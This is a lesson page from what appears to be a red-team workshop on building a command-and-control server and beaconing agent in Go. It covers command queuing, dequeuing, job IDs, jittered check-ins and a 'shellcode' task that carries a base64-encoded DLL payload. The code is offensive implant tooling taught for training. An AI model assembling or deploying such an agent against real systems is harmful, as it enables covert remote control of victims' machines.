---
showTableOfContents: true
title: "Lesson 6: Dequeue and Send Commands to Agent"
type: "page"
---
## Solutions

The starting solution can be found here.

The final solution can be found here.


## Overview

Commands are now being queued, but the agent doesn't know about them yet. When the agent checks in (hits our root endpoint), we need to:

1. Check if there's a command waiting in the queue
2. If yes, retrieve it and remove it from the queue
3. Generate a unique job ID for tracking
4. Send the command to the agent
5. If no, tell the agent there's nothing to do

In this lesson, we'll:

1. Create a new response type for server-to-agent communication
2. Implement a method to retrieve and remove commands from the queue
3. Update the RootHandler to check the queue and respond appropriately
4. Update the agent to parse and display the new response format



## What We'll Create

- `ServerResponse` type in `models/types.go`
- `GetCommand()` method in `command_api.go`
- Updated `RootHandler` in `server/server.go`
- Updated `Send()` method in `agent/agent.go`
- Updated `RunLoop` in `agent/runloop.go`

## Create ServerResponse Type

Right now, our server sends a simple string to the agent. But we need to send more structured data:

- Is there a job?
- If yes, what's the job ID, command, and arguments?

Let's create a proper response type. Add this to `models/types.go`:

```go
// ServerResponse represents a response from the server to the agent
type ServerResponse struct {
	Job       bool            `json:"job"`
	JobID     string          `json:"job_id,omitempty"`
	Command   string          `json:"command,omitempty"`
	Arguments json.RawMessage `json:"data,omitempty"`
}
```

**Understanding the fields:**

1. **Job** - Boolean indicating if there's a command to execute
    - `false` = No commands in queue, agent should sleep
    - `true` = Command available, agent should execute it
2. **JobID** - Unique identifier for this specific command execution
    - Only included when `Job` is `true` (note the `omitempty` tag)
    - Allows tracking results back to specific commands
    - Critical for multi-agent, multi-command scenarios
3. **Command** - The command keyword (e.g., "shellcode")
    - Only included when `Job` is `true`
4. **Arguments** - The processed command arguments as raw JSON
    - Only included when `Job` is `true`
    - Contains the base64 shellcode data, not the file path


**Understanding `omitempty`:** The `omitempty` JSON tag means "don't include this field if it's empty." When `Job` is `false`, we don't need JobID, Command, or Arguments, so the JSON will just be:

```json
{"job": false}
```

When `Job` is `true`, we get the full structure:

```json
{
  "job": true,
  "job_id": "job_123456",
  "command": "shellcode",
  "data": {...}
}
```



## Why Do We Need Job IDs?

In our simple workshop, job IDs might seem unnecessary. But consider a real-world scenario:

```
Time | Action
-----|-------------------------------------------------------
T1   | Command 1 queued: "Download sensitive.doc"
T2   | Command 2 queued: "Upload database.sql"
T3   | Agent checks in, gets Command 1 (JobID: job_001)
T4   | Agent checks in, gets Command 2 (JobID: job_002)
T5   | Agent sends results for job_002 (Upload succeeded)
T6   | Agent sends results for job_001 (Download failed)
```

Without job IDs, how would you know which result corresponds to which command? Job IDs provide traceability, especially when:

- Multiple agents are operating
- Commands execute at different speeds
- Results arrive out of order
- You need to correlate logs and debug issues

## Implement GetCommand Method

Now we need a method to retrieve and remove commands from the queue. Add this to `command_api.go`:

```go
// GetCommand retrieves and removes the next command from queue
func (cq *CommandQueue) GetCommand() (models.CommandClient, bool) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if len(cq.PendingCommands) == 0 {
		return models.CommandClient{}, false
	}

	cmd := cq.PendingCommands[0]
	cq.PendingCommands = cq.PendingCommands[1:]

	log.Printf("DEQUEUED: Command '%s'", cmd.Command)

	return cmd, true
}
```


### Check if queue is empty

```go
if len(cq.PendingCommands) == 0 {
    return models.CommandClient{}, false
}
```

If there are no commands, return an empty struct and `false` to indicate nothing available.


### Get the first command

```go
cmd := cq.PendingCommands[0]
```

Access the command at index 0 (the front of the queue).




### Remove it from the queue

```go
cq.PendingCommands = cq.PendingCommands[1:]
```


This is the idiomatic Go way to remove the first element from a slice:
- `[1:]` means "slice from index 1 to the end"
- This creates a new slice without the first element
- The original first element is now removed


### Return the command

```go
return cmd, true
```

Return the command and `true` to indicate a command was available.




## Update RootHandler

Now let's update the server's root endpoint handler to check the queue and respond appropriately. Replace the `RootHandler` function in `server/server.go`:

```go
func RootHandler(w http.ResponseWriter, r *http.Request) {

	log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

	var response models.ServerResponse

	// Check for pending commands
	cmd, exists := control.AgentCommands.GetCommand()
	if exists {
		log.Printf("Sending command to agent: %s\n", cmd.Command)
		response.Job = true
		response.Command = cmd.Command
		response.Arguments = cmd.Arguments
		response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
		log.Printf("Job ID: %s\n", response.JobID)
	} else {
		log.Printf("No commands in queue")
	}

	// Set content type to JSON
	w.Header().Set("Content-Type", "application/json")

	// Encode and send the response
	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Printf("Error encoding response: %v\n", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
}
```




### Create empty response

```go
var response models.ServerResponse
```


By default, all fields are zero values (`Job` is `false`, strings are empty).



### Check the queue

```go
cmd, exists := control.AgentCommands.GetCommand()
```


Try to get a command from the global queue. Returns:
- `cmd` - The command (or empty struct if none)
- `exists` - Boolean indicating if a command was available



### If command exists, populate response

```go
    if exists {
        log.Printf("Sending command to agent: %s\n", cmd.Command)
        response.Job = true
        response.Command = cmd.Command
        response.Arguments = cmd.Arguments
        response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
        log.Printf("Job ID: %s\n", response.JobID)
    }
```


### Job ID generation

```go
fmt.Sprintf("job_%06d", rand.Intn(1000000))
```

- `rand.Intn(1000000)` - Random number from 0 to 999,999
- `%06d` - Format as 6-digit decimal with leading zeros
- Result: "job_000001", "job_123456", "job_999999", etc.

Note: In production, we'd use a more robust ID system (UUID, database sequence, etc.), but this is sufficient for our workshop.





### If no command, log it

```go
else {
    log.Printf("No commands in queue")
}
```

The response remains with `Job = false`, which is what we want.

### Send the response

```go
if err := json.NewEncoder(w).Encode(response); err != nil {
```


Marshal and send the response as JSON.



## Update Agent's Send Method

Now we need the agent to parse this new response structure. Update the `Send()` method in `agent/agent.go`:

```go
// Send implements Communicator.Send for HTTPS
func (agent *Agent) Send(ctx context.Context) (*models.ServerResponse, error) {
	// Construct the URL
	url := fmt.Sprintf("https://%s/", agent.serverAddr)

	// Create GET request
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil, fmt.Errorf("creating request: %w", err)
	}

	// Send request
	resp, err := agent.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}
	defer resp.Body.Close()

	// Check status code
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("server returned status %d: %s", resp.StatusCode, body)
	}

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("reading response: %w", err)
	}

	// Unmarshal into ServerResponse
	var serverResp models.ServerResponse
	if err := json.Unmarshal(body, &serverResp); err != nil {
		return nil, fmt.Errorf("unmarshaling response: %w", err)
	}

	// Return the parsed response
	return &serverResp, nil
}
```


Let's break down our new code.


### Return type

```go
func (agent *Agent) Send(ctx context.Context) (*models.ServerResponse, error)
```

Previously returned `[]byte`, now returns `*models.ServerResponse`.

### Parse the response

```go
// Unmarshal into ServerResponse
var serverResp models.ServerResponse
if err := json.Unmarshal(body, &serverResp); err != nil {
    return nil, fmt.Errorf("unmarshaling response: %w", err)
}
    
// Return the parsed response
return &serverResp, nil
```


Instead of returning raw bytes, we unmarshal into our struct and return a pointer to it.



## Update RunLoop

Finally, let's update the agent's run loop to handle the new response format. Update `RunLoop` in `agent/runloop.go`:

```go
func RunLoop(agent *Agent, ctx context.Context, delay time.Duration, jitter int) error {

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		response, err := agent.Send(ctx)
		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(delay)
			continue // Skip to next iteration
		}

		if response.Job {
			log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", response.Command, response.JobID)
		} else {
			log.Printf("No job from Server")
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(delay, jitter)

		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}
```


### This is our new logic

```go
if response.Job {
    log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", response.Command, response.JobID)
} else {
    log.Printf("No job from Server")
}
```

Now we check the `Job` field and display relevant information:

- If `true` - Log the command name and job ID
- If `false` - Log that there's no job

This replaces the previous code that just logged the raw response string.

## Test

Let's test the complete flow!

**Start the server:**

```bash
go run ./cmd/server
```

**Start the agent:**

```bash
go run ./cmd/agent
```

**Initial agent output (no commands queued):**

```bash
2025/11/06 15:37:49 Starting Agent Run Loop
2025/11/06 15:37:49 Delay: 5s, Jitter: 50%
2025/11/06 15:37:49 No job from Server
2025/11/06 15:37:49 Sleeping for 5.22541057s
2025/11/06 15:37:54 No job from Server
2025/11/06 15:37:54 Sleeping for 6.748574669s
```

**Server output (agent checking in):**

```bash
2025/11/06 15:37:49 Endpoint / has been hit by agent
2025/11/06 15:37:49 No commands in queue
2025/11/06 15:37:54 Endpoint / has been hit by agent
2025/11/06 15:37:54 No commands in queue
```

**Now queue a command (in another terminal):**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "shellcode",
    "data": {
      "file_path": "./payloads/calc.dll",
      "export_name": "LaunchCalc"
    }
  }'
```

**Server output after queuing:**

```bash
2025/11/06 15:38:03 Received command: shellcode
2025/11/06 15:38:03 Validation passed: file_path=./payloads/calc.dll, export_name=LaunchCalc
2025/11/06 15:38:03 Processed file: ./payloads/calc.dll (111493 bytes) -> base64 (148660 chars)
2025/11/06 15:38:03 Processed command arguments: shellcode
2025/11/06 15:38:03 QUEUED: shellcode
2025/11/06 15:38:04 Endpoint / has been hit by agent
2025/11/06 15:38:04 DEQUEUED: Command 'shellcode'
2025/11/06 15:38:04 Sending command to agent: shellcode
2025/11/06 15:38:04 Job ID: job_411895
```

**Agent output after command sent:**

```bash
2025/11/06 15:38:04 Job received from Server
-> Command: shellcode
-> JobID: job_411895
2025/11/06 15:38:04 Sleeping for 3.454947595s
2025/11/06 15:38:08 No job from Server
```

**Analyzing the flow:**

1. Agent periodically checks in → Server responds "No commands"
2. Operator queues command via curl → Command validated, processed, queued
3. Agent checks in → Server dequeues command and sends it to agent
4. Agent receives command with job ID
5. Agent continues checking in → Server responds "No commands" (queue is empty now)

Perfect! The complete loop is working.

## Understanding the Complete Flow

Let's trace a command through the entire system:

1. **Operator → Server:** curl sends command with file path
2. **Server processing:** Validates, processes (file → base64), queues
3. **Agent → Server:** Agent checks in via GET request
4. **Server → Agent:** Dequeues command, generates job ID, sends response
5. **Agent receives:** Parses response, displays command and job ID
6. **Command execution:** (Next lessons) Agent will execute the command
7. **Agent → Server:** (Next lessons) Agent sends results back with job ID

## Conclusion

In this lesson, we've implemented the server-to-agent communication:

- Created the `ServerResponse` type for structured responses
- Implemented `GetCommand()` to retrieve and remove commands from the queue
- Updated `RootHandler` to check the queue and respond appropriately
- Updated the agent's `Send()` method to parse the new response structure
- Updated `RunLoop` to display job information
- Tested the complete flow from queue to agent

Our system can now:

- ✓ Receive and queue commands
- ✓ Dequeue commands when the agent checks in
- ✓ Send commands with job IDs to the agent
- ✓ Handle both "job available" and "no job" scenarios

The agent now receives commands, but doesn't execute them yet. In the next lessons, we'll implement the agent-side command execution infrastructure!






___
[|TOC|]({{< ref "./moc.md" >}})
[|PREV|]({{< ref "./05_queue.md" >}})
[|NEXT|]({{< ref "./07_execute_task.md" >}})